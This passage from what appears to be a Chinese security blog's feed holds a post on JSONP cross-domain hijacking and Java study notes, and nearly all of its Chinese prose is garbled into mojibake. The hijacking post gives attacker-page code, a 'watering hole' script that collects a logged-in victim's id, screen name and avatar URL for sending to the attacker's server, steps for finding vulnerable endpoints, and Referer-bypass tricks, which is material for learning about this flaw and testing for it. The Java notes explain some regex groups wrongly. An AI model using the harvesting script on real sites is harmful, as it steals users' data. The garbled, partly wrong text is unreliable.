çš„åå­—)</span></span></span><br><span class="line"><span class="language-javascript">            success : <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;è°ƒç”¨success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å‘å‡ºçš„getè¯·æ±‚ç­‰äºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/godown.php?id=1&amp;callback=jsonhandle</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212203153709.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212203153709.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="JSONPæ”»å‡»"><a href="#JSONPæ”»å‡»" class="headerlink" title="JSONPæ”»å‡»"></a>JSONPæ”»å‡»</h1><h2 id="jsonpè·¨åŸŸåŠ«æŒ"><a href="#jsonpè·¨åŸŸåŠ«æŒ" class="headerlink" title="jsonpè·¨åŸŸåŠ«æŒ"></a>jsonpè·¨åŸŸåŠ«æŒ</h2><p>jsonpåŠ«æŒå°±æ˜¯æ”»å‡»è€…è·å–äº†æœ¬è¯¥ä¼ ç»™æœ¬ç½‘ç«™å…¶ä»–æ¥å£çš„æ•°æ®ã€‚å°±æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œå‘æœ‰æ¼æ´çš„godown.phpå‘é€jsonpè¯·æ±‚ï¼Œphpä¸ç»è¿‡æ£€æµ‹å°±æ‰§è¡Œäº†é”™è¯¯çš„å‡½æ•°ã€‚ä½†æ˜¯godown.phpé€šå¸¸æ˜¯ç”¨æ¥è¿”å›æ•°æ®ï¼Œåˆ©ç”¨JSONPèƒ½éæ³•è·å–ç”¨æˆ·æ•°æ®</p><h2 id="jsonpè·¨åŸŸåŠ«æŒç¤ºä¾‹"><a href="#jsonpè·¨åŸŸåŠ«æŒç¤ºä¾‹" class="headerlink" title="jsonpè·¨åŸŸåŠ«æŒç¤ºä¾‹"></a>jsonpè·¨åŸŸåŠ«æŒç¤ºä¾‹</h2><p>1ï¼‰ç”¨æˆ·åœ¨ç½‘ç«™B æ³¨å†Œå¹¶ç™»å½•ï¼Œç½‘ç«™B åŒ…å«äº†ç”¨æˆ·çš„idï¼Œnameï¼Œemailç­‰ä¿¡æ¯ï¼›<br>2ï¼‰ç”¨æˆ·é€šè¿‡æµè§ˆå™¨å‘ç½‘ç«™Aå‘å‡ºURLè¯·æ±‚ï¼›<br>3ï¼‰ç½‘ç«™Aå‘ç”¨æˆ·è¿”å›å“åº”é¡µé¢ï¼Œå“åº”é¡µé¢ä¸­æ³¨å†Œäº†JavaScriptçš„å›è°ƒå‡½æ•°å’Œå‘ç½‘ç«™Bè¯·æ±‚çš„scriptæ ‡ç­¾ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Callback</span>(<span class="params">result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(result.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://B.com/user?jsonp=Callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>4ï¼‰ç”¨æˆ·æ”¶åˆ°å“åº”ï¼Œè§£æJSä»£ç ï¼Œå°†å›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°å‘ç½‘ç«™Bå‘å‡ºè¯·æ±‚ï¼›<br>5ï¼‰ç½‘ç«™Bæ¥æ”¶åˆ°è¯·æ±‚åï¼Œè§£æè¯·æ±‚çš„URLï¼Œä»¥JSON æ ¼å¼ç”Ÿæˆè¯·æ±‚éœ€è¦çš„æ•°æ®ï¼Œå°†å°è£…çš„åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„JSONæ•°æ®ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ç»™æµè§ˆå™¨ï¼Œç½‘ç«™Bè¿”å›çš„æ•°æ®å®ä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Callback</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;test@test.com&quot;</span>&#125;)ã€‚</span><br></pre></td></tr></table></figure><p>6ï¼‰ç½‘ç«™Bæ•°æ®è¿”å›åï¼Œæµè§ˆå™¨åˆ™è‡ªåŠ¨æ‰§è¡ŒCallbackå‡½æ•°å¯¹æ­¥éª¤4è¿”å›çš„JSONæ ¼å¼æ•°æ®è¿›è¡Œå¤„ç†ï¼Œé€šè¿‡alertå¼¹çª—å±•ç¤ºäº†ç”¨æˆ·åœ¨ç½‘ç«™Bçš„æ³¨å†Œä¿¡æ¯ã€‚å¦å¤–ä¹Ÿå¯å°†JSONæ•°æ®å›ä¼ åˆ°ç½‘ç«™Açš„æœåŠ¡å™¨ï¼Œè¿™æ ·ç½‘ç«™Aåˆ©ç”¨ç½‘ç«™Bçš„JSONPæ¼æ´ä¾¿è·å–åˆ°äº†ç”¨æˆ·åœ¨ç½‘ç«™Bæ³¨å†Œçš„ä¿¡æ¯ã€‚</p><p>å¯ä»¥çœ‹åˆ°jsonpåŠ«æŒå¾ˆåƒcsrfï¼Œé€šè¿‡ç½‘ç«™Açªƒå–ç”¨æˆ·åœ¨ç½‘ç«™Bçš„ä¿¡æ¯ã€‚</p><h2 id="JSONPåŠ«æŒæ¼æ´æŒ–æ˜ï¼š"><a href="#JSONPåŠ«æŒæ¼æ´æŒ–æ˜ï¼š" class="headerlink" title="JSONPåŠ«æŒæ¼æ´æŒ–æ˜ï¼š"></a>JSONPåŠ«æŒæ¼æ´æŒ–æ˜ï¼š</h2><p>ç™»å½•ç½‘ç«™ï¼ˆä¸ç™»å½•æ— æ³•çŸ¥é“æ˜¯å¦æœ‰æ•æ„Ÿæ•°æ®æ³„éœ²ï¼‰ï¼Œåœ¨chromeæµè§ˆå™¨F12ï¼ŒæŠŠä¿ç•™æ—¥å¿—å‹¾ä¸Šã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212211101925.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212211101925.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»¥freebufä¸ºä¾‹ï¼ˆå½“ç„¶freebufæ²¡æœ‰ï¼‰ï¼Œåœ¨è¿‡æ»¤çª—å£æœç´¢callbackã€jsonã€emailç­‰å…³é”®å­—ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ‰¾ç¬¦åˆå½¢å¼çš„è¯·æ±‚</p><p>æ‰¾åˆ°å¯ç–‘çš„è¯·æ±‚å°±æ‹–åˆ°urlè®¿é—®ä¸€ä¸‹çœ‹æœ‰æ²¡æœ‰å…³æ³¨çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><p>å¦‚æœå­˜åœ¨ï¼Œåˆ‡æ¢é¡µé¢çœ‹æ˜¯å¦èƒ½è¢«ä¸åŒçš„åŸŸè¯·æ±‚åˆ°ã€‚</p><p>å½“ç„¶ä»¥ä¸Šè¿‡ç¨‹å¯ä»¥æ¢ä½selenium+proxyä»£ç†å®ç°ï¼ŒéªŒè¯çš„è¯å°±å‰”é™¤Refererå­—æ®µå†è¿›è¡Œè¯·æ±‚ï¼Œä¸éœ€è¦refererå°±èƒ½æ‹¿åˆ°æ•æ„Ÿjsonï¼Œé‚£å°±å­˜åœ¨jsonpåŠ«æŒæ¼æ´</p><h2 id="jsonæ°´å‘æ”»å‡»"><a href="#jsonæ°´å‘æ”»å‡»" class="headerlink" title="jsonæ°´å‘æ”»å‡»"></a>jsonæ°´å‘æ”»å‡»</h2><p>æ‰€è°“æ°´å‘æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯é’“é±¼andä¿¡æ¯æ”¶é›†çªƒå–æ•°æ®ï¼Œå‘ç°jsonpæ¥å£ååˆ¶ä½œä¸€ä¸ªé’“é±¼ç½‘ç«™ï¼Œå…¶ä¸­åŒ…å«è‡ªåŠ¨è¯·æ±‚jsonpæ¥å£çš„è„šæœ¬ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;jsonpæ¼æ´æ¥å£&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    dataType: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">&#125;).done(function(json)&#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">id</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="type">var</span> <span class="variable">screen_name</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;screen_name&quot;</span>];</span><br><span class="line">    <span class="type">var</span> <span class="variable">profile_image_url</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;profile_image_url&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">post_data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;&amp;amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;screen_name=&quot;</span> + screen_name + <span class="string">&quot;&amp;amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;profile_image_url=&quot;</span> + encodeURIComponent(profile_image_url);</span><br><span class="line">    console.log(post_data);</span><br><span class="line">    <span class="comment">// å‘é€åˆ°æˆ‘çš„æœåŠ¡å™¨ä¸Š</span></span><br><span class="line">&#125;).fail(function() &#123;&#125;);</span><br></pre></td></tr></table></figure><p>å°†ç›®æ ‡çš„id,screen_nameå’Œprofile_image_urlå‘é€åˆ°æœ¬åœ°æœåŠ¡å™¨ã€‚</p><h2 id="JSONPè·¨åŸŸåŠ«æŒtoken"><a href="#JSONPè·¨åŸŸåŠ«æŒtoken" class="headerlink" title="JSONPè·¨åŸŸåŠ«æŒtoken"></a>JSONPè·¨åŸŸåŠ«æŒtoken</h2><p>å‘èµ·jsonpè¯·æ±‚ï¼Œè·å–tokenåè¿›è¡Œcsrfæ”»å‡»</p><h2 id="Refererç»•è¿‡"><a href="#Refererç»•è¿‡" class="headerlink" title="Refererç»•è¿‡"></a>Refererç»•è¿‡</h2><ol><li><p>åˆ©ç”¨data URLæ„é€ æ— Refererè¯·æ±‚ã€‚</p></li><li><p>HTTPSå‘é€HTTPè¯·æ±‚ã€‚ç›®æ ‡ç½‘ç«™å¯ä»¥é€šè¿‡HTTPè®¿é—®æ—¶ï¼ŒHTTPSé¡µé¢å‘èµ·HTTPè¯·æ±‚é»˜è®¤ä¸å‘é€Referer</p></li></ol><p>å‚è€ƒï¼š<a href="https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</a></p><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</a></p>]]></content>
      
      
      <categories>
          
          <category> æº¯æº </category>
          
          <category> JSONP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æº¯æº </tag>
            
            <tag> JSONP </tag>
            
            <tag> èœœç½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/05/10/java-xue-xi-bi-ji/"/>
      <url>/2022/05/10/java-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå­¦ä¹ ç®€è®°"><a href="#javaå­¦ä¹ ç®€è®°" class="headerlink" title="javaå­¦ä¹ ç®€è®°"></a>javaå­¦ä¹ ç®€è®°</h1><p>å­¦ä¹ CCé“¾è¿‡ç¨‹ä¸­å‘ç°javaæ°´å¹³ä¸å¤Ÿï¼Œæœ¬ç¬”è®°ä¸»è¦ä»‹ç»javaæˆ‘ä¸ªäººè®¤ä¸ºæ¯”è¾ƒé‡è¦æˆ–è€…å›°éš¾çš„åœ°æ–¹ã€‚</p><h2 id="ç±»å®šä¹‰"><a href="#ç±»å®šä¹‰" class="headerlink" title="ç±»å®šä¹‰"></a>ç±»å®šä¹‰</h2><p>abstractå£°æ˜æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•ï¼ˆæ²¡æœ‰ä»»ä½•å®ç°çš„ç±»å’Œæ–¹æ³•ï¼‰ï¼Œä¸ºäº†ä»¥åæ‰©å……ã€‚å¦‚æœç±»æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé‚£è¯¥ç±»ä¹Ÿå¿…é¡»ä¸ºæŠ½è±¡ç±»</p><p>extendsç»§æ‰¿çˆ¶ç±»,implementså®šä¹‰æ¥å£</p><p>synchronizedå®šä¹‰æ–¹æ³•åªèƒ½åŒæ—¶è¢«ä¸€ä¸ªçº¿ç¨‹è®¿é—®</p><p>transientä¿®é¥°å˜é‡ï¼Œåœ¨åºåˆ—åŒ–æ—¶å¿½ç•¥è¯¥å˜é‡</p><p>volatileä¿®é¥°çš„æˆå‘˜å˜é‡åœ¨æ¯æ¬¡è¢«çº¿ç¨‹è®¿é—®æ—¶éƒ½è¦é‡è¯»å€¼ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªçº¿ç¨‹è®¿é—®åˆ°çš„éƒ½æ˜¯åŒä¸€å€¼ã€‚åŒæ—¶ä¹Ÿç»„ç»‡äº†ç¼–è¯‘å™¨å¯¹è¯¥å˜é‡è¿›è¡Œä¼˜åŒ–</p><p>Characterä¼ charå‚æ•°ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºCharacterå¯¹è±¡ï¼Œå«åšè£…ç®±ã€‚è£…ç®±åæ•°æ®ç±»å‹ä¸ºå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨å¯¹åº”çš„è®¸å¤šæ–¹æ³•</p><p>Stringå®šä¹‰çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œå®šä¹‰åä¸å¯æ”¹å˜ã€‚æ”¹å˜çš„è¯éœ€è¦ç”¨StringBufferæˆ–è€…StringBuilderã€‚String.format()æ·»åŠ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå¸¦å‚æ•°çš„å­—ç¬¦ä¸²ï¼‰</p><p>å¤„ç†æ•°ç»„æ—¶å¯ä»¥ä½¿ç”¨å¾ªç¯æˆ–è€…foreachå¾ªç¯ã€‚util.Arraysç±»ä¹Ÿæä¾›äº†èµ‹å€¼ã€æ’åºã€æ¯”è¾ƒã€æŸ¥æ‰¾ç­‰æ–¹æ³•</p><ul><li><code>for(double element:List)&#123;&#125;</code>å¾ªç¯éå†Listæ•°ç»„é‡Œçš„doubleç±»å‹å…ƒç´ ï¼Œè¯¥å…ƒç´ åœ¨æ¯æ¬¡å¾ªç¯ç”¨elementå‘½åä½¿ç”¨</li></ul><h2 id="æ­£åˆ™åŒ¹é…ï¼š"><a href="#æ­£åˆ™åŒ¹é…ï¼š" class="headerlink" title="æ­£åˆ™åŒ¹é…ï¼š"></a>æ­£åˆ™åŒ¹é…ï¼š</h2><ul><li>æ¯”å¦‚w3Cschoolé‡Œçš„ä»£ç ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;This order was placed for QT3000! OK?&quot;</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">pattern</span> <span class="operator">=</span> <span class="string">&quot;(.*)(\\d+)(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åˆ›å»º Pattern å¯¹è±¡</span></span><br><span class="line">      <span class="type">Pattern</span> <span class="variable">r</span> <span class="operator">=</span> Pattern.compile(pattern);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ç°åœ¨åˆ›å»º matcher å¯¹è±¡</span></span><br><span class="line">      <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> r.matcher(line);</span><br><span class="line">      <span class="keyword">if</span> (m.find( )) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">0</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">1</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">2</span>) );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;NO MATCH&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§æ•è·ç»„çš„æ€è·¯ï¼Œgroup(0)ä¸º<code>(.*)(\\d+)(.*)</code>ï¼Œ<code>(.*)</code>è¡¨ç¤ºé™¤äº†æ¢è¡Œå¤–çš„ä»»æ„å­—ç¬¦ä¸²ã€‚<code>\\</code>è½¬ä¹‰ä¸º<code>\</code>ï¼Œ<code>\d</code>åŒ¹é…æ•°å­—ï¼Œ<code>+</code>åŒ¹é…ä»¥+å‰é¢å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚â€zo+â€åŒ¹é…â€zoâ€å’Œâ€zooâ€ã€‚</p><p>æ‰€ä»¥<code>(\\d)</code>åŒ¹é…åˆ°çš„å€¼ä¸º3000ï¼Œ<code>(\\d+)</code>åŒ¹é…åˆ°çš„å€¼ä¸º0ï¼Œ<code>(.*)(\\d+)(.*)</code>åŒ¹é…åˆ°çš„å€¼ä¸ºQT3000! OK? å³group(0)çš„å€¼</p><p>group(1)ä¸º<code>(.*)</code>ï¼Œå€¼ä¸ºQT300</p><p>group(2)ä¸º<code>(\\d+)</code>ï¼Œå€¼ä¸º0</p><ul><li>start()è¿”å›åŒ¹é…å­—ç¬¦ä¸²çš„èµ·å§‹å­—ç¬¦åœ¨æ•´ä¸ªè¢«åŒ¹é…å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œend()åˆ™æ˜¯ç»“æŸä½ç½®ã€‚countè¿”å›åŒ¹é…æˆåŠŸçš„æ¬¡æ•°</li><li>é™¤æ­¤ä»¥å¤–è¿˜æœ‰matchesæ•´ä¸²åŒ¹é…ï¼ŒlookingAtéƒ¨åˆ†åŒ¹é…ã€‚replaceFirsté¦–æ¬¡æ›¿æ¢ï¼ŒreplaceAllå…¨éƒ¨æ›¿æ¢ã€‚appendReplacementæ­£åˆ™æ›¿æ¢ï¼ŒappendTailåŒ¹é…å®Œæˆçš„å­—ç¬¦ä¸²è¿”å›ç»™å¯¹è±¡</li></ul><h1 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h1><ul><li>å¯å˜å‚æ•°ï¼š<code>...</code>ä½œæœ€åä¸€ä¸ªå‚æ•°æ—¶è¡¨ç¤ºå¯æ¥å—å¤šä¸ªå‚æ•°</li><li>å›æ”¶å¯¹è±¡ï¼š<code>finalize()</code>æŒ‡å®šå¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œçš„æ“ä½œï¼Œè¦ç”¨protectedé™å®šä»¥å…è¢«ç±»å¤–è°ƒç”¨ã€‚é”€æ¯å¯¹è±¡å¯ä»¥åœ¨ç±»æ–¹æ³•é‡Œè°ƒç”¨<code>System.gc()</code>ï¼Œè¯¥æ–¹æ³•å°†å›æ”¶å®ƒæ‰€å®šä¹‰çš„â€œåƒåœ¾â€ã€‚finalizeä¸€èˆ¬ä»¥<code>super.finalize()</code>çš„æ–¹å¼ä½¿ç”¨ï¼ˆè¶…ç±»ç»ˆç»“å™¨ï¼‰</li></ul><h3 id="æµ"><a href="#æµ" class="headerlink" title="æµ"></a>æµ</h3><ul><li>æ§åˆ¶å°è¾“å…¥æµï¼š</li></ul><p><code>BufferedReader bi = new BufferedReader(new InputStreamReader(System.in));</code></p><p>å°†System.inåŒ…è£…åœ¨BufferReaderå¯¹è±¡ä¸­åˆ›å»ºå­—ç¬¦æµã€‚å¯¹å­—ç¬¦æµå­˜åœ¨å¾ˆå¤šæ“ä½œã€‚æ¯”å¦‚read()æ–¹æ³•è¯»å–è¾“å…¥çš„å­—ç¬¦ï¼Œæˆ–è€…ç”¨readLine()è¯»å–å­—ç¬¦ä¸²ï¼ˆenterä¸ºæ•°ç»„ä¸‹ä¸€ç´¢å¼•ï¼‰ï¼Œè¯»å–ç»“æŸä¼šè¿”å›IOException</p><ul><li>æ§åˆ¶å°è¾“å‡ºæµ</li></ul><p><code>System.out.write(å­—ç¬¦ä¸²oræµ)</code>è¾“å‡ºæµã€‚System.outæ˜¯PrintStreamç±»å¯¹è±¡çš„å¼•ç”¨ï¼ŒPrintStreamç»§æ‰¿OutoutStreamå¹¶å®ç°äº†write()ã€‚æ‰€ä»¥è¯¥æ–¹æ³•çš„ä½œç”¨å’Œprintln()å’Œprint()ä¸€æ ·ã€‚</p><ul><li>æ–‡ä»¶è¯»å–æµ</li></ul><p><code>InputStream f = new FileInputStream(&quot;æ–‡ä»¶è·¯å¾„&quot;)</code>ä¹Ÿå¯ä»¥å‘å­—ç¬¦ä¸²çš„ä½ç½®å¡«ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ã€‚åˆ›å»ºè¾“å…¥æµå¯¹è±¡è¯»å–æ–‡ä»¶</p><ul><li>æ–‡ä»¶å†™å…¥æµ</li></ul><p><code>OutputStream f = new FileOutputStream(&quot;æ–‡ä»¶è·¯å¾„&quot;)</code>å†™å…¥å†…å®¹ï¼ŒåŒç†ä¹Ÿèƒ½å¡«æ–‡ä»¶å¯¹è±¡</p><ul><li>Scanneræ•°æ®è¾“å…¥</li></ul><p>æ§åˆ¶å°è¾“å…¥æµæ“ä½œèµ·æ¥ä¸æ–¹ä¾¿ï¼Œå¯ä»¥ç”¨<code>Scanner scan = new Scanner(System.in)</code>æ¥æ”¶æ•°æ®ï¼Œå†ä½¿ç”¨Scannerç±»çš„æ–¹æ³•ã€‚è€Œnextå’Œnextçš„æ–¹æ³•ç»†èŠ‚è¯·çœ‹<code>https://www.w3cschool.cn/java/java-scanner-class.html</code></p><h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><p>å­¦è¿‡pythonçš„è¯ï¼Œæˆ‘è®°å¾—tryâ€¦exceptâ€¦æ¶‰åŠå¼‚å¸¸å¤„ç†ï¼ŒC++å’ŒPHPé‡Œåˆ™æ˜¯tryâ€¦catchâ€¦ã€‚éƒ½æ˜¯tryé‡Œçš„å‡½æ•°å¯èƒ½æ¶‰åŠå¼‚å¸¸ï¼Œå‡ºç°å¼‚å¸¸åˆ™throwä¸€ç§Exceptionï¼Œcatchåˆ°è¯¥ç±»Exceptionè¿›è¡Œå¤„ç†ã€‚javaä¹Ÿæœ‰ä½¿ç”¨tryâ€¦catchè¿›è¡Œå¼‚å¸¸å¤„ç†çš„ï¼Œåªä¸è¿‡æ²¡æœ‰å®šä¹‰æ–¹æ³•æ—¶è¿›è¡Œå¼‚å¸¸å¤„ç†å¸¸ç”¨ã€‚</p><p>javaå†…ç½®äº†å¼‚å¸¸ç±»åœ¨java.langåŒ…ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚æ¯”å¦‚æ•°ç»„è¶Šç•Œå¼‚å¸¸ArrayIndexOutOfBoundsExceptionã€‚å¼‚å¸¸ç±»é€šå¸¸æ¥åœ¨æ–¹æ³•å£°æ˜ä¸­ï¼Œæ¯”å¦‚<code>public void a(double b) throws RemoteException&#123;&#125;</code>ï¼Œthrowå¼‚å¸¸ç±»ä¼šè‡ªåŠ¨æ•æ‰å¹¶å¤„ç†å¼‚å¸¸</p><ul><li>finallyæ”¾åœ¨<code>try...catch...</code>çš„æœ€åï¼Œæ˜¯è¿è¡Œå®Œ<code>try...catch...</code>å¿…å®šä¼šå¤„ç†çš„å†…å®¹ï¼ˆä¸ä¸€å®šéè¦finallyç»“å°¾)</li><li>è‡ªå®šä¹‰å¼‚å¸¸ã€‚<code>class AException extends Exception&#123;&#125;</code>ï¼Œå®šä¹‰AExceptionå¼‚å¸¸ï¼ŒåŒæ—¶å¯ä»¥é‡æ„å…¶æ„é€ å‡½æ•°æ¥å¯¹å¼‚å¸¸è¿›è¡Œå¤„ç†ã€‚</li></ul><h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><p>æ‰€æœ‰ç±»éƒ½æ˜¯ä»java.lang.Objectç±»ç»§æ‰¿æ¥çš„ï¼Œé™¤äº†Objectå¤–æ‰€æœ‰ç±»éƒ½å¿…é¡»æœ‰ä¸€ä¸ªçˆ¶ç±»</p><ul><li><p>extendsç»§æ‰¿çš„å­ç±»æœ‰çˆ¶ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®çˆ¶ç±»çš„privateæˆå‘˜ã€‚å­ç±»å¯ä»¥é‡å†™çˆ¶ç±»çš„ä»»ä½•æ–¹æ³•ï¼Œä½†æ˜¯é€šå¸¸å¿…é¡»æ»¡è¶³ï¼š1.å‚æ•°åˆ—è¡¨ç›¸åŒ 2.è¿”å›ç±»å‹æ˜¯çˆ¶ç±»æ´¾ç”Ÿç±» 3.è®¿é—®æƒé™å¤§äºç­‰äºçˆ¶ç±»è¯¥æ–¹æ³• 4.finalã€staticä¸èƒ½è¢«é‡å†™ã€‚ç­‰è¦æ±‚ï¼ˆèœé¸Ÿä½¿ç”¨å°±å®Œå…¨ä¸€æ ·çš„å£°æ˜æ–¹å¼ï¼Œåˆ«è®°ï¼‰</p></li><li><p>instanceofæ£€æŸ¥Aæ˜¯å¦ä¸ºBçš„å­ç±»</p></li><li><p>javaä¸èƒ½åŒæ—¶ç»§æ‰¿å¤šä¸ªç±»ï¼Œä½†æ˜¯å¯ä»¥åŒæ—¶å®ç°å¤šä¸ªæ¥å£</p></li></ul><p>å­ç±»è°ƒç”¨çˆ¶ç±»<strong>è¢«é‡å†™</strong>æ–¹æ³•æ—¶ç”¨superï¼Œæ¯”å¦‚ä¸‹åˆ—ä»£ç Dogå°±æ˜¯è°ƒç”¨äº†çˆ¶ç±»Animalçš„moveã€‚å¦‚æœæ˜¯æ„é€ å‡½æ•°ï¼Œç›´æ¥<code>super();</code>å°±èƒ½è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 